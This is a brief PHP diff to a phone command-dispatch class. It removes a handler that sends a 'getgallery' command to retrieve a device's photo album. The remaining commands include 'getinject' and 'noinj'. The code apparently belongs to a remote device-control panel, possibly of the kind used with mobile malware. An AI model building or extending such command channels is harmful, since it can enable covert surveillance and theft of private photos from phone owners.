@@ -59,7 +59,6 @@ final class PanelSendHandler
             'noinj' => $this->handleNoInject($phoneId, $message),
             'display' => $this->handleDisplay($phoneId, $message),
             'getinject' => $this->handleGetInject($phoneId),
-            'getgallery' => $this->handleGetGallery($phoneId),
             default => $this->forwardToDevice($phoneId, $message),
         };
     }
@@ -396,15 +395,6 @@ final class PanelSendHandler
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'getinject',
-        ]);
-    }
-
-    private function handleGetGallery(string $phoneId): void
-    {
-        // 获取相册命令（参考 Node.js 原始实现）
-        $this->connectionManager->sendToDevice($phoneId, [
-            'type' => 'screencomd',
-            'subc' => 'getgallery',
         ]);
     }
 
